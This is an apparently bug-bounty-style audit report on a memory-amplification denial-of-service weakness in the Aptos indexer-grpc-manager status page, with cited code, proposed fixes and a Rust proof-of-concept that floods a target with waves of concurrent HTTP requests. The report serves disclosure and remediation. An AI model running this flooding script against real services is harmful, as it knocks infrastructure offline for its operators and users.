# Audit Report

## Title
Unnecessary Deep Cloning in Status Page Generation Enables Memory Exhaustion DoS Attack

## Summary
The indexer-grpc-manager's status page endpoint unnecessarily clones entire VecDeques (up to 100 historical data service entries each) when only the most recent entry is needed for rendering. This amplifies memory allocation by 100x and enables an unauthenticated attacker to cause memory exhaustion through concurrent HTTP requests to the publicly accessible status page endpoint.

## Finding Description

The vulnerability exists in the data flow between `MetadataManager::get_historical_data_services_info()` and the status page rendering functions. 

The `get_historical_data_services_info()` method clones the entire `recent_states` VecDeque for every historical data service: [1](#0-0) 

Each VecDeque is bounded to 100 entries via `MAX_NUM_OF_STATES_TO_KEEP`: [2](#0-1) 

However, the `render_historical_data_service_streams()` function only uses the **last entry** from each VecDeque: [3](#0-2) 

The status page is exposed as a public HTTP endpoint at the root path without authentication: [4](#0-3) 

The server binds to all network interfaces (0.0.0.0): [5](#0-4) 

Each `HistoricalDataServiceInfo` can contain `StreamInfo` with up to 120 progress samples (60 recent + 60 old): [6](#0-5) 

**Attack Flow:**
1. Attacker identifies the health_check_port of an indexer-grpc-manager instance
2. Attacker sends concurrent HTTP GET requests to `http://<target>:<health_check_port>/`
3. Each request triggers status_page() which calls get_historical_data_services_info()
4. For N historical data services, N × 100 entries are cloned (each ~4-5KB with StreamProgress data)
5. With 20 services: 20 × 100 × 5KB = 10MB cloned per request
6. With 100 concurrent requests: 1GB memory spike
7. Repeated waves of concurrent requests cause memory exhaustion and potential OOM crash

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: High (API Crashes)**

The vulnerability enables an unauthenticated attacker to cause service degradation or complete API unavailability on indexer-grpc-manager instances:

- **Service Disruption**: Memory exhaustion can cause the indexer-grpc-manager to slow down, become unresponsive, or crash entirely
- **Cascading Effects**: The indexer-grpc-manager coordinates between fullnodes, live data services, and historical data services. Its unavailability disrupts the entire indexer infrastructure
- **No Authentication Required**: The status page endpoint is public and requires no credentials
- **Low Attack Cost**: Simple HTTP GET requests with no special payload required
- **Amplification Factor**: 100x memory amplification (cloning 100 entries when only 1 is used)

While this does not directly affect blockchain consensus (indexer is auxiliary infrastructure), it impacts the availability of critical indexing infrastructure that many ecosystem applications depend on.

Per Aptos bug bounty criteria, this qualifies as **High Severity** due to "API crashes" that can be triggered remotely without authentication.

## Likelihood Explanation

**Likelihood: High**

The attack is highly likely to succeed because:

1. **Public Endpoint**: The status page is accessible at the root path on the health_check_port without any authentication or rate limiting
2. **Zero Prerequisites**: Attacker needs no credentials, tokens, or prior system knowledge
3. **Simple Execution**: Attack consists of standard HTTP GET requests that can be scripted trivially
4. **Predictable Behavior**: The memory allocation pattern is deterministic based on the number of historical data services
5. **Observable Impact**: Attacker can monitor response times to gauge effectiveness

**Attacker Requirements:**
- Network access to the health_check_port (typically exposed for monitoring)
- Basic HTTP client (curl, browser, or simple script)
- Ability to send concurrent requests

**Complexity: Low** - No special expertise or tools required beyond basic HTTP knowledge.

## Recommendation

Replace the full VecDeque cloning with selective extraction of only the last entry needed for rendering:

**Fix for `metadata_manager.rs`:**
```rust
// Add a new method that only returns the last entry
pub(crate) fn get_historical_data_services_last_info(
    &self,
) -> HashMap<GrpcAddress, Option<HistoricalDataServiceInfo>> {
    self.historical_data_services
        .iter()
        .map(|entry| {
            (
                entry.key().clone(),
                entry.value().recent_states.back().cloned(),
            )
        })
        .collect()
}
```

**Fix for `status_page.rs`:**
```rust
// Update render_historical_data_service_streams to use the new method
fn render_historical_data_service_streams(
    data_service_info: &HashMap<String, Option<HistoricalDataServiceInfo>>,
) -> Table {
    let streams = data_service_info
        .iter()
        .filter_map(|entry| {
            entry.1.as_ref().and_then(|sample| {
                sample.stream_info.as_ref().map(|stream_info| {
                    let data_service_instance = entry.0.clone();
                    (
                        data_service_instance,
                        sample.timestamp.unwrap(),
                        stream_info.clone(),
                    )
                })
            })
        })
        .collect();

    render_stream_table(streams)
}
```

**Additional mitigations:**
1. Implement rate limiting on the status page endpoint
2. Add authentication or restrict access to localhost/private network only
3. Apply the same fix to `get_fullnodes_info()` and `get_live_data_services_info()` which have identical issues: [7](#0-6) 

## Proof of Concept

**Rust reproduction script:**

```rust
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() {
    let target_url = "http://localhost:8084/"; // Replace with actual health_check_port
    let concurrent_requests = 100;
    let waves = 10;
    
    println!("Starting DoS attack simulation...");
    println!("Target: {}", target_url);
    println!("Concurrent requests per wave: {}", concurrent_requests);
    println!("Number of waves: {}", waves);
    
    for wave in 1..=waves {
        println!("\n=== Wave {} ===", wave);
        let mut handles = vec![];
        
        for i in 0..concurrent_requests {
            let url = target_url.to_string();
            let handle = tokio::spawn(async move {
                let start = std::time::Instant::now();
                match reqwest::get(&url).await {
                    Ok(resp) => {
                        let duration = start.elapsed();
                        println!("Request {} completed in {:?} (status: {})", 
                                i, duration, resp.status());
                    }
                    Err(e) => {
                        println!("Request {} failed: {}", i, e);
                    }
                }
            });
            handles.push(handle);
        }
        
        // Wait for all requests in this wave to complete
        for handle in handles {
            let _ = handle.await;
        }
        
        // Brief pause between waves
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    
    println!("\n=== Attack simulation complete ===");
}
```

**Expected behavior:**
- Initial requests return quickly with status 200
- As waves progress, response times increase dramatically
- Server memory usage grows significantly
- Eventually server becomes unresponsive or crashes with OOM

**Verification:**
Monitor the target server's memory usage during the attack using `ps aux | grep grpc-manager` or similar tools to observe memory growth corresponding to concurrent requests.

## Notes

This vulnerability affects all three similar methods in `MetadataManager`:
- `get_fullnodes_info()` (line 376-381)
- `get_live_data_services_info()` (line 383-390)  
- `get_historical_data_services_info()` (line 392-399)

All three clone entire VecDeques when only the last entry is used for status page rendering. The same fix pattern should be applied to all three methods to comprehensively address the issue.

The indexer-grpc-data-service-v2 component has proper sample pruning implemented, but the MetadataManager's VecDeque cloning negates this optimization at the aggregation layer.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L36-37)
```rust
// The maximum # of states for each service we keep.
const MAX_NUM_OF_STATES_TO_KEEP: usize = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L376-390)
```rust
    pub(crate) fn get_fullnodes_info(&self) -> HashMap<String, VecDeque<FullnodeInfo>> {
        self.fullnodes
            .iter()
            .map(|entry| (entry.key().clone(), entry.value().recent_states.clone()))
            .collect()
    }

    pub(crate) fn get_live_data_services_info(
        &self,
    ) -> HashMap<GrpcAddress, VecDeque<LiveDataServiceInfo>> {
        self.live_data_services
            .iter()
            .map(|entry| (entry.key().clone(), entry.value().recent_states.clone()))
            .collect()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L392-399)
```rust
    pub(crate) fn get_historical_data_services_info(
        &self,
    ) -> HashMap<GrpcAddress, VecDeque<HistoricalDataServiceInfo>> {
        self.historical_data_services
            .iter()
            .map(|entry| (entry.key().clone(), entry.value().recent_states.clone()))
            .collect()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L258-278)
```rust
fn render_historical_data_service_streams(
    data_service_info: &HashMap<String, VecDeque<HistoricalDataServiceInfo>>,
) -> Table {
    let streams = data_service_info
        .iter()
        .filter_map(|entry| {
            entry.1.back().cloned().and_then(|sample| {
                sample.stream_info.map(|stream_info| {
                    let data_service_instance = entry.0.clone();
                    (
                        data_service_instance,
                        sample.timestamp.unwrap(),
                        stream_info,
                    )
                })
            })
        })
        .collect();

    render_stream_table(streams)
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L219-222)
```rust
    let status_endpoint = warp::path::end().and_then(move || {
        let config = config.clone();
        async move { config.status_page().await }
    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L257-258)
```rust
        .run(([0, 0, 0, 0], port))
        .await;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L28-29)
```rust
static MAX_RECENT_SAMPLES_TO_KEEP: usize = 60;
static MAX_OLD_SAMPLES_TO_KEEP: usize = 60;
```
